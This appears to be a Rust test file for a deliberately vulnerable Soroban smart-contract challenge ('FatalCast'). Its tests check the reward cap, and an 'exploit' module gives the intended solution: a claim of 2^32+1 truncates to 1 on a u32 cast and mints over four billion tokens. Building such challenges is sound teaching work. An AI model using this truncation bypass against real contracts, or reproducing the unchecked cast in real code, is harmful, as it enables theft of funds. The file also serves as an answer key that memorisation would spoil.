extern crate std;

use super::{Error, FatalCast, FatalCastClient, MAX_REWARD};
use soroban_sdk::{Address, Env, testutils::Address as _};

fn setup() -> (Env, FatalCastClient<'static>, Address) {
    let env = Env::default();
    let player = Address::generate(&env);
    let issuer = Address::generate(&env);
    let token = env.register_stellar_asset_contract_v2(issuer).address();
    let id = env.register(FatalCast, (&player, &token));
    let client = FatalCastClient::new(&env, &id);
    (env, client, player)
}

#[test]
fn honest_claim_is_capped() {
    let (env, client, player) = setup();
    env.mock_all_auths();

    client.claim_reward(&player, &(MAX_REWARD as i128));
    assert_eq!(client.balance(&player), 100);
    assert!(!client.is_solved(&player));
}

#[test]
fn claim_above_cap_is_rejected() {
    let (env, client, player) = setup();
    env.mock_all_auths();

    assert_eq!(
        client.try_claim_reward(&player, &101),
        Err(Ok(Error::RewardTooLarge.into()))
    );
}

#[test]
fn non_positive_claims_are_rejected() {
    let (env, client, player) = setup();
    env.mock_all_auths();

    assert_eq!(
        client.try_claim_reward(&player, &0),
        Err(Ok(Error::InvalidAmount.into()))
    );
    // Truncates to 50 and would pass the cap if negatives were allowed.
    let wraps_to_50 = -(1i128 << 32) + 50;
    assert_eq!(
        client.try_claim_reward(&player, &wraps_to_50),
        Err(Ok(Error::InvalidAmount.into()))
    );
}

#[test]
fn second_claim_is_rejected() {
    let (env, client, player) = setup();
    env.mock_all_auths();

    client.claim_reward(&player, &100);
    assert_eq!(
        client.try_claim_reward(&player, &100),
        Err(Ok(Error::AlreadyClaimed.into()))
    );
}

#[test]
fn claim_requires_player_auth() {
    let (_env, client, player) = setup();

    assert!(client.try_claim_reward(&player, &100).is_err());
}

/// The intended solution. Kept on main so `cargo test` proves the level is solvable.
mod exploit {
    use super::*;

    #[test]
    fn truncating_cast_bypasses_the_cap() {
        let (env, client, player) = setup();
        env.mock_all_auths();

        // 2^32 + 1 truncates to 1 as a u32, which passes the cap.
        let amount: i128 = (1i128 << 32) + 1;
        client.claim_reward(&player, &amount);

        assert_eq!(client.balance(&player), 4_294_967_297);
        assert!(client.is_solved(&player));
    }

    #[test]
    fn inflating_another_address_does_not_solve_it() {
        let (env, client, player) = setup();
        env.mock_all_auths();

        let other = Address::generate(&env);
        client.claim_reward(&other, &((1i128 << 32) + 1));

        assert!(!client.is_solved(&player));
        assert!(!client.is_solved(&other));
    }
}
